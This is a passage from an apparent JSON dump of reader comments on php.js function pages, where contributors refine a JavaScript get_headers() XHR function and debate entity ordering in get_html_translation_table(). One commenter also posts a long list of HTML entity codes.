Santos: I'm testing from console using the .\/phpjstest.php file in the _tools directory in svn. But what's strange is that code from file_size (which I thought was identical) does not break."},{"date":"2008-12-04 14:54:40","author":"Paulo Ricardo F. Santos","url":"","comment":"Oops, sorry for the inconvenient - it's a bit buggy and I don't know how it worked before.\r\n\r\nThis snippet should fixes all the problems:\r\n\r\n[code=&quot;javascript&quot;]    tmp = req.getAllResponseHeaders().split('\\n');\r\n    tmp.pop();\r\n    headers = [req.status + ' ' + req.statusText];\r\n \r\n    for (i in tmp) {\r\n        if (format) {\r\n            pair = tmp[i].split(':');\r\n            headers[pair.splice(0, 1)] = pair.join(':').replace(\/^\\s+|\\s+$\/g, '');\r\n        } else {\r\n            headers[headers.length] = tmp[i];\r\n        }\r\n    }[\/code]\r\n\r\nHere's a temporary demo - working as expected: http:\/\/www.ceciliadassi.com\/get_headers.html\r\n\r\n[]'s"},{"date":"2008-12-04 16:17:03","author":"Paulo Ricardo F. Santos","url":"","comment":"Hmm, might be useful replace\r\n\r\n[code=&quot;javascript&quot;]tmp.pop();[\/code]\r\n\r\nto\r\n\r\n[code=&quot;javascript&quot;]tmp = array_filter(tmp, function (str) { return str.replace(\/^\\s+|\\s+$\/g, '') != ''; });[\/code]\r\n\r\nto avoid any unexpected problem. ;)"},{"date":"2008-12-04 16:51:53","author":"Paulo Ricardo F. Santos","url":"","comment":"Ah! This line:\r\n\r\n[code]headers[pair.splice(0, 1)] = pair.join(':').replace(\/^\\s+|\\s+$\/g, '');[\/code]\r\n\r\nmight be only this, there's no difference:\r\n\r\n[code]headers[pair.splice(0, 1)] = pair.join(':');[\/code]\r\n\r\nAnd as far I've noted, to work properly in Opera, the AJAX request should be asynchronized, as here: http:\/\/www.ceciliadassi.com\/get_headers2.js. Synchronized requests returns false in the most of times. ;\/"},{"date":"2008-12-04 23:20:01","author":"Paulo Ricardo F. Santos","url":"","comment":"OMG! Sorry for the flood and ignore my last 2 comments (#7 and #8 - I was quite confused). Here's the function with corrections:\r\n\r\n[code=&quot;javascript&quot;]\r\nfunction get_headers(url, format) {\r\n    var req = window.ActiveXObject ? new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) : new XMLHttpRequest();\r\n    if (!req) throw new Error('XMLHttpRequest not supported');\r\n    var tmp, headers, pair, i;\r\n \r\n    req.open('HEAD', url, false);\r\n    req.send(null);\r\n\r\n    if (req.readyState &lt; 3) {\r\n        return false;\r\n    }\r\n\r\n    tmp = req.getAllResponseHeaders();alert(tmp);\r\n    tmp = tmp.split('\\n');\r\n    tmp = array_filter(tmp, function (value) { return value.substring(1) != ''; });\r\n    headers = [req.status + ' ' + req.statusText];\r\n \r\n    for (i in tmp) {\r\n        if (format) {\r\n            pair = tmp[i].split(':');\r\n            headers[pair.splice(0, 1)] = pair.join(':').substring(1);\r\n        } else {\r\n            headers[headers.length] = tmp[i];\r\n        }\r\n    }\r\n\r\n    return headers;\r\n}\r\n[\/code]\r\nAbout the Opera problem, I don't know how to fix it. In my tests, Opera 9.62 returned a empty string in statusText property and getAllResponseHeaders() function - only status property returned as expected. Both Firefox 3 and IE 7 worked perfectly. :)"},{"date":"2008-12-10 16:46:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Paulo Ricardo F. Santos: hehe, no problem! Thanks for giving the final function complete though, makes my job a little easier :)"},{"date":"2010-11-21 15:27:04","author":"Joey","url":"","comment":"I have a problem whit the http header the page give 303 see other, but i need the headers of tha page! But the function don't show how to fix."},{"date":"2010-11-22 07:25:13","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Joey: Due to security restrictions in JavaScript, this function can only work if the script you are trying to get is on the same domain (or if the site you are targeting is granting HTML5 CORS access and browsers support it)."},{"date":"2012-01-27 18:03:15","author":"T.Wild","url":"","comment":"This should be marked as having a dependency on array_filter (line 23) or be recoded."},{"date":"2012-06-16 06:52:05","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@T.Wild: Forgot to let you know the dependency line was added. Thanks!"}],"get_html_translation_table":[{"date":"2008-10-25 17:32:15","author":"noname","url":"","comment":"You need to change position for some lines.\r\nFrom:\r\n[CODE=&quot;Javascript&quot;]\r\n    entities['60'] = '&amp;lt;';\r\n    entities['62'] = '&amp;gt;';\r\n    entities['38'] = '&amp;amp;';\r\n[\/CODE]\r\n\r\nTo:\r\n[CODE=&quot;Javascript&quot;]\r\n    entities['38'] = '&amp;amp;';\r\n    entities['60'] = '&amp;lt;';\r\n    entities['62'] = '&amp;gt;';\r\n[\/CODE]\r\n\r\nBecause it will be encode wrong. Example:\r\n&lt;a&gt;  =&gt; &amp;amp;lt;a&amp;amp;gt;"},{"date":"2008-11-03 10:23:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ noname: I've committed your fix noname, thanks!"},{"date":"2008-11-30 16:39:50","author":"GreLI","url":"","comment":"Instead of this:\r\n[CODE=&quot;Javascript&quot;]\r\nentities['38'] = '&amp;amp;amp;';\r\nentities['60'] = '&amp;amp;lt;';\r\nentities['62'] = '&amp;amp;gt;';\r\n[\/CODE]\r\nYou can write\r\n[CODE=&quot;Javascript&quot;]\r\nentities = {\r\n'38': '&amp;amp;amp;',\r\n'60': '&amp;amp;lt;',\r\n'62': '&amp;amp;gt;'\r\n}\r\n[\/CODE]\r\nto reduce size and increase readability."},{"date":"2008-12-01 09:34:04","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ GreLI: It was easier developing (read: copy &amp; pasting ;) that way. We might want to switch back  to reduce it's size though, that's a good point, thanks."},{"date":"2009-02-20 13:09:05","author":"Alex","url":"","comment":"need replace:\r\nentities['39'] = '&amp;#039;';\r\nto\r\nentities['39'] = '&amp;#39;';"},{"date":"2009-02-21 12:50:51","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Alex: Ok I've changed it in SVN, can you tell me why is that?"},{"date":"2009-02-23 16:22:52","author":"Marco","url":"","comment":"I suggest that you add a ; after the following code so that the script can be packed to one line (for example with: http:\/\/dean.edwards.name\/packer\/)\r\n\r\n[code]symbol = String.fromCharCode(decimal)[\/code]"},{"date":"2009-02-25 16:36:30","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Marco: Excellent suggestion, thanks!"},{"date":"2009-02-26 02:56:45","author":"madipta","url":"http:\/\/www.madipta.com","comment":"i think you need to move entities['38'] on top\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\r\n    entities['38'] = '&amp;';\r\n\r\n    if (useQuoteStyle != 'ENT_NOQUOTES') {\r\n        entities['34'] = '&quot;';\r\n    }\r\n \r\n    if (useQuoteStyle == 'ENT_QUOTES') {\r\n        entities['39'] = ''';\r\n    }\r\n[\/CODE]"},{"date":"2009-03-02 14:37:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ madipta: Thank you: fixed."},{"date":"2009-04-30 07:53:00","author":"KELAN","url":"","comment":"[CODE]\r\n    useTable      = (table ? table.toUpperCase() : 'HTML_SPECIALCHARS');\r\n    useQuoteStyle = (quote_style ? quote_style.toUpperCase() : 'ENT_COMPAT');\r\n    \r\n    \/\/ Translate arguments\r\n    constMappingTable[0]      = 'HTML_SPECIALCHARS';\r\n    constMappingTable[1]      = 'HTML_ENTITIES';\r\n    constMappingQuoteStyle[0] = 'ENT_NOQUOTES';\r\n    constMappingQuoteStyle[2] = 'ENT_COMPAT';\r\n    constMappingQuoteStyle[3] = 'ENT_QUOTES';\r\n    \r\n    \/\/ Map numbers to strings for compatibilty with PHP constants\r\n    if (!isNaN(useTable)) {\r\n        useTable = constMappingTable[useTable];\r\n    }\r\n    if (!isNaN(useQuoteStyle)) {\r\n        useQuoteStyle = constMappingQuoteStyle[useQuoteStyle];\r\n    }\r\n\r\n[\/CODE]\r\n\r\n==> get_html_translation_table(0,2);\r\n\r\n[CODE]\r\n    constMappingTable[0]      = 'HTML_SPECIALCHARS';\r\n    constMappingTable[1]      = 'HTML_ENTITIES';\r\n    constMappingQuoteStyle[0] = 'ENT_NOQUOTES';\r\n    constMappingQuoteStyle[2] = 'ENT_COMPAT';\r\n    constMappingQuoteStyle[3] = 'ENT_QUOTES';\r\n\tuseTable \t  = !isNaN(table) ? constMappingTable[table] : table ? table.toUpperCase() : 'HTML_SPECIALCHARS';\r\n\tuseQuoteStyle = !isNaN(quote_style) ? constMappingQuoteStyle[table] : quote_style ? quote_style.toUpperCase() : 'ENT_COMPAT';\r\n\r\n[\/CODE]"},{"date":"2009-04-30 07:55:27","author":"KELAN","url":"","comment":"useQuoteStyle = !isNaN(quote_style) ? constMappingQuoteStyle[quote_style] : quote_style ? quote_style.toUpperCase() : 'ENT_COMPAT';"},{"date":"2009-04-30 09:27:22","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Thanks... Done in SVN. I also simplified the if\/else following"},{"date":"2009-07-04 23:35:45","author":"Ratheous","url":"","comment":"Because the ampersand is used in all entities, and htmlspecialchars etc. washes the string through the split and join repeatedly, entities['38'] should be the first item in the array and the first character replaced. Thus any ampersand already in the string will be correctly replaced but those introduced by the replacement of other characters will remain intact. \n\nSomeone may have commented on this previously; it's hard to tell because the comments are a bit hard to follow, but regardless, it hasn't been fixed.\n\nMoving it up to line 40 solves the problem in my code, but if I remember correctly the use of for...in doesn't guarantee iterators in a particular order so it might be better to take it out of the entities table and replace it separately (though in my experience they come out in the order they were assigned).\n\nP.S. Just as an observation, you use 'histogram' as a variable name in a number of functions for what is actually a hash table...\n\nhis?to?gram?\/?h?st??gr\u00e6m\/ \n\n\u2013noun Statistics.\na graph of a frequency distribution in which rectangles with bases on the horizontal axis are given widths equal to the class intervals and heights equal to the corresponding frequencies."},{"date":"2009-07-05 03:25:18","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"It was fixed recently in subversion (SVN). It just needed some time to be made available.\n\nYes, it's true that ECMAScript doesn't guarantee the order of execution within objects, but I understand that all major browsers maintain the order (and PHP.JS in general depends on this, being as we rely on objects for associative array-like behavior).\n\nGood point about \"histogram\". Maybe someone copied it from count_chars() which looks like that one used the word correctly. Anyways, I fixed it for the other functions (entity ones) where it was indeed not correct."},{"date":"2009-07-08 16:34:24","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"Great stuff!"},{"date":"2009-10-20 16:51:08","author":"Roger","url":"","comment":"Things can be so easy:\n[CODE]\nfunction toHTMLEntity(str) {\n\tvar s = str.split(\"\");\n\tvar ret = \"\";\n\tfor (i = 0; i < s.length; i++) {\n\t\tvar c = s[i].charCodeAt(0);\n\t\tif(c > 127) ret += (\"&#\" + c + \";\");\n\t\telse ret += s[i];\n\t}\n\treturn ret;\n}\n\n[\/CODE]\n"},{"date":"2009-10-20 20:06:18","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Roger: Yes, things can be that easy, if that's what you are trying to do. However, your function creating numeric character references has no relation to substituting for get_html_translation_table() for those who need it (nor for htmlentities() or htmlspecialchars() which depend on it). "},{"date":"2009-11-17 11:09:51","author":"Nick Kolosov","url":"http:\/\/sammy.ru","comment":"Entities order must depend on the direction of translation.\r\nWith conversion <a> => &lt;a>\r\n  entities['38'] must be the first one.\r\nWith conversion &lt;a> => <a>\r\n  entities['38'] must be the last one.\r\n\r\nCurrent version with html_entity_decode converts &amp;nbsp; to space instead of &nbsp;. Its' wrong.\r\n\r\nMay be html_entity_decode must be corrected, js is not my s trong side, don't know how to reverse hash order\r\n"},{"date":"2009-11-17 11:23:32","author":"Nick Kolosov","url":"http:\/\/sammy.ru","comment":"Ups, blog eated html tags. Error example:\n[CODE]\nhtml_entity_decode('&amp;nbsp;') = ' ' instead of '&nbsp'\n[\/CODE]"},{"date":"2009-12-02 10:23:07","author":"Fox","url":"","comment":"Sure it's not a good solution, but to answer to Nick Kolosov, and as I had the same problem with using :\r\n- htmlspecialchars => encode\r\n- html_entity_decode => decode\r\nAnd my aim was to not add parameters in functions (keep functions like php). I decided to add a small code in decode functions in order to fix the problem.\r\nin html_entity_decode function before :\r\n[CODE]\r\n  for (symbol in hash_map) {\r\n[\/CODE]\r\nadd the following lines :\r\n[CODE]\r\n  \/\/ BOF : fix &amp; problem\r\n  delete(hash_map['&']);\r\n  hash_map['&']\t= '&amp;';\r\n  \/\/ EOF : fix &amp; problem\r\n[\/CODE]"},{"date":"2009-12-14 15:34:38","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Nick Kolosov: Thanks for reporting.\n\n@ Fox: Thanks for fixing : )\n\nWill be online shortly folks."},{"date":"2011-06-14 14:52:26","author":"Pitouli","url":"","comment":"A bigger list for replacement :\n\n[CODE]\nentities['38'] = '&amp;';\nentities['60'] = '&lt;';\nentities['62'] = '&gt;';\n\nentities['94'] = '&circ;';\nentities['126'] = '&tilde;';\n\nentities['130'] = '&sbquo;';\t\/\/ Single Low-9 Quotation Mark\nentities['131'] = '&fnof;';\t\t\/\/ Latin Small Letter F With Hook\nentities['132'] = '&bdquo;';\t\/\/ Double Low-9 Quotation Mark\nentities['133'] = '&hellip;';\t\/\/ Horizontal Ellipsis\nentities['134'] = '&dagger;';\t\/\/ Dagger\nentities['135'] = '&Dagger;';\t\/\/ Double Dagger\nentities['136'] = '&circ;';\t\t\/\/ Modifier Letter Circumflex Accent\nentities['137'] = '&permil;';\t\/\/ Per Mille Sign\nentities['138'] = '&Scaron;';\t\/\/ Latin Capital Letter S With Caron\nentities['139'] = '&lsaquo;';\t\/\/ Single Left-Pointing Angle Quotation Mark\nentities['140'] = '&OElig;';\t\/\/ Latin Capital Ligature OE\nentities['145'] = '&lsquo;';\t\/\/ Left Single Quotation Mark\nentities['146'] = '&rsquo;';\t\/\/ Right Single Quotation Mark\nentities['147'] = '&ldquo;';\t\/\/ Left Double Quotation Mark\nentities['148'] = '&rdquo;';\t\/\/ Right Double Quotation Mark\nentities['149'] = '&bull;';\t\t\/\/ Bullet\nentities['150'] = '&ndash;';\t\/\/ En Dash\nentities['151'] = '&mdash;';\t\/\/ Em Dash\nentities['152'] = '&tilde;';\t\/\/ Small Tilde\nentities['153'] = '&trade;';\t\/\/ Trade Mark Sign\nentities['154'] = '&scaron;';\t\/\/ Latin Small Letter S With Caron\nentities['155'] = '&rsaquo;';\t\/\/ Single Right-Pointing Angle Quotation Mark\nentities['156'] = '&oelig;';\t\/\/ Latin Small Ligature OE\nentities['159'] = '&Yuml;';\t\t\/\/ Latin Capital Letter Y With Diaeresis\n\nentities['160'] = '&nbsp;';\t\t\/\/ Non-breaking space\nentities['161'] = '&iexcl;';\t\t\/\/ Inverted exclamation mark\nentities['162'] = '&cent;';\t\t\/\/ Cent sign\nentities['163'] = '&pound;';\t\t\/\/ Pound sign\nentities['164'] = '&curren;';\t\/\/ Currency sign\nentities['165'] = '&yen;';\t\t\/\/ Yen sign\nentities['166'] = '&brvbar;';\t\/\/ Broken vertical bar\nentities['167'] = '&sect;';\t\t\/\/ Section sign\nentities['168'] = '&uml;';\t\t\/\/ Diaeresis\nentities['169'] = '&copy;';\t\t\/\/ Copyright sign\nentities['170'] = '&ordf;';\t\t\/\/ Feminine ordinal indicator\nentities['171'] = '&laquo;';\t\t\/\/ Left-pointing double angle quotation mark\nentities['172'] = '&not;';\t\t\/\/ Not sign\nentities['173'] = '&shy;';\t\t\/\/ Soft hyphen\nentities['174'] = '&reg;';\t\t\/\/ Registered sign\nentities['175'] = '&macr;';\t\t\/\/ Macron\nentities['176'] = '&deg;';\t\t\/\/ Degree sign\nentities['177'] = '&plusmn;';\t\/\/ Plus-minus sign\nentities['178'] = '&sup2;';\t\t\/\/ Superscript two\nentities['179'] = '&sup3;';\t\t\/\/ Superscript three\nentities['180'] = '&acute;';\t\t\/\/ Acute accent\nentities['181'] = '&micro;';\t\t\/\/ Micro sign\nentities['182'] = '&para;';\t\t\/\/ Pilcrow sign\nentities['183'] = '&middot;';\t\/\/ Middle dot\nentities['184'] = '&cedil;';\t\t\/\/ Cedilla\nentities['185'] = '&sup1;';\t\t\/\/ Superscript one\nentities['186'] = '&ordm;';\t\t\/\/ Masculine ordinal indicator\nentities['187'] = '&raquo;';\t\t\/\/ Right-pointing double angle quotation mark\nentities['188'] = '&frac14;';\t\/\/ Vulgar fraction one-quarter\nentities['189'] = '&frac12;';\t\/\/ Vulgar fraction one-half\nentities['190'] = '&frac34;';\t\/\/ Vulgar fraction three-quarters\nentities['191'] = '&iquest;';\t\/\/ Inverted question mark\nentities['192'] = '&Agrave;';\t\/\/ A with grave\nentities['193'] = '&Aacute;';\t\/\/ A with acute\nentities['194'] = '&Acirc;';\t\t\/\/ A with circumflex\nentities['195'] = '&Atilde;';\t\/\/ A with tilde\nentities['196'] = '&Auml;';\t\t\/\/ A with diaeresis\nentities['197'] = '&Aring;';\t\t\/\/ A with ring above\nentities['198'] = '&AElig;';\t\t\/\/ AE\nentities['199'] = '&Ccedil;';\t\/\/ C with cedilla\nentities['200'] = '&Egrave;';\t\/\/ E with grave\nentities['201'] = '&Eacute;';\t\/\/ E with acute\nentities['202'] = '&Ecirc;';\t\t\/\/ E with circumflex\nentities['203'] = '&Euml;';\t\t\/\/ E with diaeresis\nentities['204'] = '&Igrave;';\t\/\/ I with grave\nentities['205'] = '&Iacute;';\t\/\/ I with acute\nentities['206'] = '&Icirc;';\t\t\/\/ I with circumflex\nentities['207'] = '&Iuml;';\t\t\/\/ I with diaeresis\nentities['208'] = '&ETH;';\t\t\/\/ Eth\nentities['209'] = '&Ntilde;';\t\/\/ N with tilde\nentities['210'] = '&Ograve;';\t\/\/ O with grave\nentities['211'] = '&Oacute;';\t\/\/ O with acute\nentities['212'] = '&Ocirc;';\t\t\/\/ O with circumflex\nentities['213'] = '&Otilde;';\t\/\/ O with tilde\nentities['214'] = '&Ouml;';\t\t\/\/ O with diaeresis\nentities['215'] = '&times;';\t\t\/\/ Multiplication sign\nentities['216'] = '&Oslash;';\t\/\/ O with stroke\nentities['217'] = '&Ugrave;';\t\/\/ U with grave\nentities['218'] = '&Uacute;';\t\/\/ U with acute\nentities['219'] = '&Ucirc;';\t\t\/\/ U with circumflex\nentities['220'] = '&Uuml;';\t\t\/\/ U with diaeresis\nentities['221'] = '&Yacute;';\t\/\/ Y with acute\nentities['222'] = '&THORN;';\t\t\/\/ Thorn\nentities['223'] = '&szlig;';\t\t\/\/ Sharp s. Also known as ess-zed\nentities['224'] = '&agrave;';\t\/\/ a with grave\nentities['225'] = '&aacute;';\t\/\/ a with acute\nentities['226'] = '&acirc;';\t\t\/\/ a with circumflex\nentities['227'] = '&atilde;';\t\/\/ a with tilde\nentities['228'] = '&auml;';\t\t\/\/ a with diaeresis\nentities['229'] = '&aring;';\t\t\/\/ a with ring above\nentities['230'] = '&aelig;';\t\t\/\/ ae. Also known as ligature ae\nentities['231'] = '&ccedil;';\t\/\/ c with cedilla\nentities['232'] = '&egrave;';\t\/\/ e with grave\nentities['233'] = '&eacute;';\t\/\/ e with acute\nentities['234'] = '&ecirc;';\t\t\/\/ e with circumflex\nentities['235'] = '&euml;';\t\t\/\/ e with diaeresis\nentities['236'] = '&igrave;';\t\/\/ i with grave\nentities['237'] = '&iacute;';\t\/\/ i with acute\nentities['238'] = '&icirc;';\t\t\/\/ i with circumflex\nentities['239'] = '&iuml;';\t\t\/\/ i with diaeresis\nentities['240'] = '&eth;';\t\t\/\/ eth\nentities['241'] = '&ntilde;';\t\/\/ n with tilde\nentities['242'] = '&ograve;';\t\/\/ o with grave\nentities['243'] = '&oacute;';\t\/\/ o with acute\nentities['244'] = '&ocirc;';\t\t\/\/ o with circumflex\nentities['245'] = '&otilde;';\t\/\/ o with tilde\nentities['246'] = '&ouml;';\t\t\/\/ o with diaeresis\nentities['247'] = '&divide;';\t\/\/ Division sign\nentities['248'] = '&oslash;';\t\/\/ o with stroke. Also known as o with slash\nentities['249'] = '&ugrave;';\t\/\/ u with grave\nentities['250'] = '&uacute;';\t\/\/ u with acute\nentities['251'] = '&ucirc;';\t\t\/\/ u with circumflex\nentities['252'] = '&uuml;';\t\t\/\/ u with diaeresis\nentities['253'] = '&yacute;';\t\/\/ y with acute\nentities['254'] = '&thorn;';\t\t\/\/ thorn\nentities['255'] = '&yuml;';\t\t\/\/ y with diaeresis\nentities['264'] = '&#264;';\t\t\/\/ Latin capital letter C with circumflex\nentities['265'] = '&#265;';\t\t\/\/ Latin small letter c with circumflex\nentities['338'] = '&OElig;';\t\t\/\/ Latin capital ligature OE\nentities['339'] = '&oelig;';\t\t\/\/ Latin small ligature oe\nentities['352'] = '&Scaron;';\t\/\/ Latin capital letter S with caron\nentities['353'] = '&scaron;';\t\/\/ Latin small letter s with caron\nentities['372'] = '&#372;';\t\t\/\/ Latin capital letter W with circumflex\nentities['373'] = '&#373;';\t\t\/\/ Latin small letter w with circumflex\nentities['374'] = '&#374;';\t\t\/\/ Latin capital letter Y with circumflex\nentities['375'] = '&#375;';\t\t\/\/ Latin small letter y with circumflex\nentities['376'] = '&Yuml;';\t\t\/\/ Latin capital letter Y with diaeresis\nentities['402'] = '&fnof;';\t\t\/\/ Latin small f with hook, function, florin\nentities['710'] = '&circ;';\t\t\/\/ Modifier letter circumflex accent\nentities['732'] = '&tilde;';\t\t\/\/ Small tilde\nentities['913'] = '&Alpha;';\t\t\/\/ Alpha\nentities['914'] = '&Beta;';\t\t\/\/ Beta\nentities['915'] = '&Gamma;';\t\t\/\/ Gamma\nentities['916'] = '&Delta;';\t\t\/\/ Delta\nentities['917'] = '&Epsilon;';\t\/\/ Epsilon\nentities['918'] = '&Zeta;';\t\t\/\/ Zeta\nentities['919'] = '&Eta;';\t\t\/\/ Eta\nentities['920'] = '&Theta;';\t\t\/\/ Theta\nentities['921'] = '&Iota;';\t\t\/\/ Iota\nentities['922'] = '&Kappa;';\t\t\/\/ Kappa\nentities['923'] = '&Lambda;';\t\/\/ Lambda\nentities['924'] = '&Mu;';\t\t\/\/ Mu\nentities['925'] = '&Nu;';\t\t\/\/ Nu\nentities['926'] = '&Xi;';\t\t\/\/ Xi\nentities['927'] = '&Omicron;';\t\/\/ Omicron\nentities['928'] = '&Pi;';\t\t\/\/ Pi\nentities['929'] = '&Rho;';\t\t\/\/ Rho\nentities['931'] = '&Sigma;';\t\t\/\/ Sigma\nentities['932'] = '&Tau;';\t\t\/\/ Tau\nentities['933'] = '&Upsilon;';\t\/\/ Upsilon\nentities['934'] = '&Phi;';\t\t\/\/ Phi\nentities['935'] = '&Chi;';\t\t\/\/ Chi\nentities['936'] = '&Psi;';\t\t\/\/ Psi\nentities['937'] = '&Omega;';\t\t\/\/ Omega\nentities['945'] = '&alpha;';\t\t\/\/ alpha\nentities['946'] = '&beta;';\t\t\/\/ beta\nentities['947'] = '&gamma;';\t\t\/\/ gamma\nentities['948'] = '&delta;';\t\t\/\/ delta\nentities['949'] = '&epsilon;';\t\/\/ epsilon\nentities['950'] = '&zeta;';\t\t\/\/ zeta\nentities['951'] = '&eta;';\t\t\/\/ eta\nentities['952'] = '&theta;';\t\t\/\/ theta\nentities['953'] = '&iota;';\t\t\/\/ iota\nentities['954'] = '&kappa;';\t\t\/\/ kappa\nentities['955'] = '&lambda;';\t\/\/ lambda\nentities['956'] = '&mu;';\t\t\/\/ mu\nentities['957'] = '&nu;';\t\t\/\/ nu\nentities['958'] = '&xi;';\t\t\/\/ xi\nentities['959'] = '&omicron;';\t\/\/ omicron\nentities['960'] = '&pi;';\t\t\/\/ pi\nentities['961'] = '&rho;';\t\t\/\/ rho\nentities['962'] = '&sigmaf;';\t\/\/ sigmaf\nentities['963'] = '&sigma;';\t\t\/\/ sigma\nentities['964'] = '&tau;';\t\t\/\/ tau\nentities['965'] = '&upsilon;';\t\/\/ upsilon\nentities['966'] = '&phi;';\t\t\/\/ phi\nentities['967'] = '&chi;';\t\t\/\/ chi\nentities['968'] = '&psi;';\t\t\/\/ psi\nentities['969'] = '&omega;';\t\t\/\/ omega\nentities['977'] = '&thetasym;';\t\/\/ Theta symbol\nentities['978'] = '&upsih;';\t\t\/\/ Greek upsilon with hook symbol\nentities['982'] = '&piv;';\t\t\/\/ Pi symbol\nentities['8194'] = '&ensp;';\t\t\/\/ En space\nentities['8195'] = '&emsp;';\t\t\/\/ Em space\nentities['8201'] = '&thinsp;';\t\/\/ Thin space\nentities['8204'] = '&zwnj;';\t\t\/\/ Zero width non-joiner\nentities['8205'] = '&zwj;';\t\t\/\/ Zero width joiner\nentities['8206'] = '&lrm;';\t\t\/\/ Left-to-right mark\nentities['8207'] = '&rlm;';\t\t\/\/ Right-to-left mark\nentities['8211'] = '&ndash;';\t\/\/ En dash\nentities['8212'] = '&mdash;';\t\/\/ Em dash\nentities['8216'] = '&lsquo;';\t\/\/ Left single quotation mark\nentities['8217'] = '&rsquo;';\t\/\/ Right single quotation mark\nentities['8218'] = '&sbquo;';\t\/\/ Single low-9 quotation mark\nentities['8220'] = '&ldquo;';\t\/\/ Left double quotation mark\nentities['8221'] = '&rdquo;';\t\/\/ Right double quotation mark\nentities['8222'] = '&bdquo;';\t\/\/ Double low-9 quotation mark\nentities['8224'] = '&dagger;';\t\/\/ Dagger\nentities['8225'] = '&Dagger;';\t\/\/ Double dagger\nentities['8226'] = '&bull;';\t\t\/\/ Bullet\nentities['8230'] = '&hellip;';\t\/\/ Horizontal ellipsis\nentities['8240'] = '&permil;';\t\/\/ Per mille sign\nentities['8242'] = '&prime;';\t\/\/ Prime\nentities['8243'] = '&Prime;';\t\/\/ Double Prime\nentities['8249'] = '&lsaquo;';\t\/\/ Single left-pointing angle quotation\nentities['8250'] = '&rsaquo;';\t\/\/ Single right-pointing angle quotation\nentities['8254'] = '&oline;';\t\/\/ Overline\nentities['8260'] = '&frasl;';\t\/\/ Fraction Slash\nentities['8364'] = '&euro;';\t\t\/\/ Euro sign\nentities['8472'] = '&weierp;';\t\/\/ Script capital\nentities['8465'] = '&image;';\t\/\/ Blackletter capital I\nentities['8476'] = '&real;';\t\t\/\/ Blackletter capital R\nentities['8482'] = '&trade;';\t\/\/ Trade mark sign\nentities['8501'] = '&alefsym;';\t\/\/ Alef symbol\nentities['8592'] = '&larr;';\t\t\/\/ Leftward arrow\nentities['8593'] = '&uarr;';\t\t\/\/ Upward arrow\nentities['8594'] = '&rarr;';\t\t\/\/ Rightward arrow\nentities['8595'] = '&darr;';\t\t\/\/ Downward arrow\nentities['8596'] = '&harr;';\t\t\/\/ Left right arrow\nentities['8629'] = '&crarr;';\t\/\/ Downward arrow with corner leftward. Also known as carriage return\nentities['8656'] = '&lArr;';\t\t\/\/ Leftward double arrow. ISO 10646 does not say that lArr is the same as the 'is implied by' arrow but also does not have any other character for that function. So ? lArr can be used for 'is implied by' as ISOtech suggests\nentities['8657'] = '&uArr;';\t\t\/\/ Upward double arrow\nentities['8658'] = '&rArr;';\t\t\/\/ Rightward double arrow. ISO 10646 does not say this is the 'implies' character but does not have another character with this function so ? rArr can be used for 'implies' as ISOtech suggests\nentities['8659'] = '&dArr;';\t\t\/\/ Downward double arrow\nentities['8660'] = '&hArr;';\t\t\/\/ Left-right double arrow\n\/\/ Mathematical Operators\nentities['8704'] = '&forall;';\t\/\/ For all\nentities['8706'] = '&part;';\t\t\/\/ Partial differential\nentities['8707'] = '&exist;';\t\/\/ There exists\nentities['8709'] = '&empty;';\t\/\/ Empty set. Also known as null set and diameter\nentities['8711'] = '&nabla;';\t\/\/ Nabla. Also known as backward difference\nentities['8712'] = '&isin;';\t\t\/\/ Element of\nentities['8713'] = '&notin;';\t\/\/ Not an element of\nentities['8715'] = '&ni;';\t\t\/\/ Contains as member\nentities['8719'] = '&prod;';\t\t\/\/ N-ary product. Also known as product sign. Prod is not the same character as U+03A0 'greek capital letter pi' though the same glyph might be used for both\nentities['8721'] = '&sum;';\t\t\/\/ N-ary summation. Sum is not the same character as U+03A3 'greek capital letter sigma' though the same glyph might be used for both\nentities['8722'] = '&minus;';\t\/\/ Minus sign\nentities['8727'] = '&lowast;';\t\/\/ Asterisk operator\nentities['8729'] = '&#8729;';\t\/\/ Bullet operator\nentities['8730'] = '&radic;';\t\/\/ Square root. Also known as radical sign\nentities['8733'] = '&prop;';\t\t\/\/ Proportional to\nentities['8734'] = '&infin;';\t\/\/ Infinity\nentities['8736'] = '&ang;';\t\t\/\/ Angle\nentities['8743'] = '&and;';\t\t\/\/ Logical and. Also known as wedge\nentities['8744'] = '&or;';\t\t\/\/ Logical or. Also known as vee\nentities['8745'] = '&cap;';\t\t\/\/ Intersection. Also known as cap\nentities['8746'] = '&cup;';\t\t\/\/ Union. Also known as cup\nentities['8747'] = '&int;';\t\t\/\/ Integral\nentities['8756'] = '&there4;';\t\/\/ Therefore\nentities['8764'] = '&sim;';\t\t\/\/ tilde operator. Also known as varies with and similar to. The tilde operator is not the same character as the tilde, U+007E, although the same glyph might be used to represent both\nentities['8773'] = '&cong;';\t\t\/\/ Approximately equal to\nentities['8776'] = '&asymp;';\t\/\/ Almost equal to. Also known as asymptotic to\nentities['8800'] = '&ne;';\t\t\/\/ Not equal to\nentities['8801'] = '&equiv;';\t\/\/ Identical to\nentities['8804'] = '&le;';\t\t\/\/ Less-than or equal to\nentities['8805'] = '&ge;';\t\t\/\/ Greater-than or equal to\nentities['8834'] = '&sub;';\t\t\/\/ Subset of\nentities['8835'] = '&sup;';\t\t\/\/ Superset of. Note that nsup, 'not a superset of, U+2283' is not covered by the Symbol font encoding and is not included.\nentities['8836'] = '&nsub;';\t\t\/\/ Not a subset of\nentities['8838'] = '&sube;';\t\t\/\/ Subset of or equal to\nentities['8839'] = '&supe;';\t\t\/\/ Superset of or equal 